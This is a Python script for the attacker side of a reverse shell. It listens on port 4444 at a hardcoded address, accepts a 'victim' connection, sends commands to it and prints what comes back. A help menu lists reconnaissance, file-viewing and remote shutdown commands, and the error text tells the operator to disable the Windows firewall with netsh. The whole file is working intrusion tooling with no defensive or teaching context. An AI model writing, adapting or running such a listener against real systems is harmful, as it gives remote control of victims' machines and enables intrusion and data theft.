#!/usr/bin/env python3
"""
REVERSE SHELL ATTACKER/LISTENER
Run on: 198.168.100.4
"""
import socket
import threading
import sys
import time


class ReverseShellAttacker:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False

    def start(self):
        """Start the attacker listener"""
        print("\n" + "=" * 50)
        print("REVERSE SHELL ATTACKER")
        print("=" * 50)
        print(f"[*] IP Address: 198.168.100.4")
        print(f"[*] Listening Port: {self.port}")
        print(f"[*] Waiting for victim connection...")
        print("[*] Press Ctrl+C to stop\n")

        try:
            # Create TCP socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Bind to all interfaces
            self.server_socket.bind((self.host, self.port))

            # Listen for connections
            self.server_socket.listen(5)
            self.running = True

            # Display listening status
            print(f"[+] Listening on {self.host}:{self.port}")
            print("[+] Make sure Windows Firewall is disabled!")
            print("[+] Waiting for victim to connect...\n")

            # Accept connection
            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"[+] VICTIM CONNECTED: {self.client_address[0]}")

            # Send welcome message
            welcome_msg = """
[+] ====================================
[+] REVERSE SHELL CONNECTION ESTABLISHED
[+] ====================================
[+] Attacker: 198.168.100.4
[+] Victim: {}
[+] Time: {}
[+] Type 'help' for commands or 'exit' to quit
[+] ====================================\n
""".format(self.client_address[0], time.ctime())

            self.client_socket.send(welcome_msg.encode())

            # Start interactive shell
            self.interactive_shell()

        except KeyboardInterrupt:
            print("\n[*] Stopped by user")
        except Exception as e:
            print(f"\n[-] ERROR: {e}")
            print("[*] Troubleshooting:")
            print("    1. Run as Administrator")
            print("    2. Disable firewall: netsh advfirewall set allprofiles state off")
            print("    3. Check port: netstat -ano | findstr :{}".format(self.port))
        finally:
            self.cleanup()

    def interactive_shell(self):
        """Interactive command shell"""
        print("[+] Starting interactive shell...")

        while self.running:
            try:
                # Get command from attacker
                command = input("\nattacker@shell> ").strip()

                if not command:
                    continue

                # Send command to victim
                self.client_socket.send(command.encode())

                # Check for exit command
                if command.lower() == "exit":
                    print("[*] Closing connection...")
                    break

                # Special commands
                if command.lower() == "help":
                    self.show_help()
                    continue

                if command.lower() == "clear":
                    print("\n" * 50)
                    continue

                # Receive response from victim
                print("\n" + "=" * 50)
                print("[VICTIM OUTPUT]")
                print("=" * 50)

                # Receive all data
                total_data = b""
                self.client_socket.settimeout(2)

                try:
                    while True:
                        chunk = self.client_socket.recv(4096)
                        if not chunk:
                            break
                        total_data += chunk
                except socket.timeout:
                    pass
                finally:
                    self.client_socket.settimeout(None)

                # Display response
                if total_data:
                    print(total_data.decode('utf-8', errors='ignore'))
                else:
                    print("[+] Command executed (no output)")

                print("=" * 50)

            except KeyboardInterrupt:
                print("\n[*] Sending exit command...")
                self.client_socket.send(b"exit")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    def show_help(self):
        """Show help menu"""
        help_text = """
[+] ====================================
[+] REVERSE SHELL COMMANDS
[+] ====================================
[+] Basic Commands:
    help          - Show this help
    exit          - Exit shell
    clear         - Clear screen

[+] System Information:
    whoami        - Current user
    systeminfo    - System information
    ipconfig      - Network configuration
    netstat       - Network connections
    tasklist      - Running processes

[+] File Operations:
    dir           - List directory
    cd [path]     - Change directory
    type [file]   - View file (Windows)
    cat [file]    - View file (Linux)

[+] Remote Control:
    shutdown /s   - Shutdown victim
    restart       - Restart victim
    screenshot    - Take screenshot

[+] ====================================
"""
        print(help_text)

    def cleanup(self):
        """Cleanup resources"""
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("\n[*] Connection closed")
        print("[*] Listener stopped")


def main():
    """Main function"""
    # Configuration
    ATTACKER_PORT = 4444

    # Create and start attacker
    attacker = ReverseShellAttacker(port=ATTACKER_PORT)
    attacker.start()


if __name__ == "__main__":
    main()
